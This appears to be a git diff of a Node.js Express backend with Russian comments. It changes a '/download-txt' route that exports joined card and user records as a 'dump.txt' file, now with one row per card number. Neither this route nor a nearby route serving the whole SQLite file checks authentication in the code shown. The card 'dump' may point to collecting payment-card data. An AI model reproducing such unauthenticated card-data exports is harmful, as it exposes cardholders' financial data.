@@ -92,12 +92,11 @@ initDB()
       }
     });
 
-    // Скачать дамп в текстовом формате (без дубликатов по пользователям)
-   app.get('/download-txt', async (req, res) => {
-  try {
-    // Подзапрос GROUP BY clientNumber гарантирует, 
-    // что на каждый clientNumber от users будет ровно одна строка
-    const rows = await db.all(`
+    // Скачать дамп в текстовом формате (без дублей по номеру карты)
+    app.get('/download-txt', async (req, res) => {
+      try {
+        // Получаем все записи
+        const rows = await db.all(`
       SELECT
         c.id         AS cardId,
         u.id         AS userId,
@@ -121,28 +120,35 @@ initDB()
         ON c.clientNumber = u.clientNumber
     `);
 
-    // Составляем текст
-    const lines = rows.map(r =>
-      Object.entries(r)
-        .map(([k, v]) => `${k}=${v}`)
-        .join('\t')
-    );
-    const content = lines.join('\n');
+        // Оставляем только одну запись на каждый cardNumber
+        const seen = new Set();
+        const uniqueRows = [];
+        for (const r of rows) {
+          if (!seen.has(r.cardNumber)) {
+            seen.add(r.cardNumber);
+            uniqueRows.push(r);
+          }
+        }
 
-    // Отдаём файл
-    res.setHeader('Content-Type',  'text/plain; charset=utf-8');
-    res.setHeader('Content-Disposition', 'attachment; filename="dump.txt"');
-    res.send(content);
+        // Формируем текст
+        const lines = uniqueRows.map(r =>
+          Object.entries(r)
+            .map(([k, v]) => `${k}=${v}`)
+            .join('\t')
+        );
+        const content = lines.join('\n');
 
-  } catch (e) {
-    console.error('Ошибка генерации дампа:', e);
+        // Отдаём файл
+        res.setHeader('Content-Type', 'text/plain');
+        res.setHeader('Content-Disposition', 'attachment; filename="dump.txt"');
+        res.send(content);
+      } catch (e) {
+        console.error('Error in /download-txt:', e);
+        res.status(500).send('Ошибка генерации дампа');
+      }
+    });
 
-    // Вместо 500 отдадим пустой текст –  клиент всё равно получит 200 и скачает empty-файл
-    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
-    res.setHeader('Content-Disposition', 'attachment; filename="dump.txt"');
-    res.send('');
-  }
-});
+
     // Скачать файл базы SQLite
     app.get('/download', (req, res) => {
       const file = path.join(__dirname, 'data.sqlite');
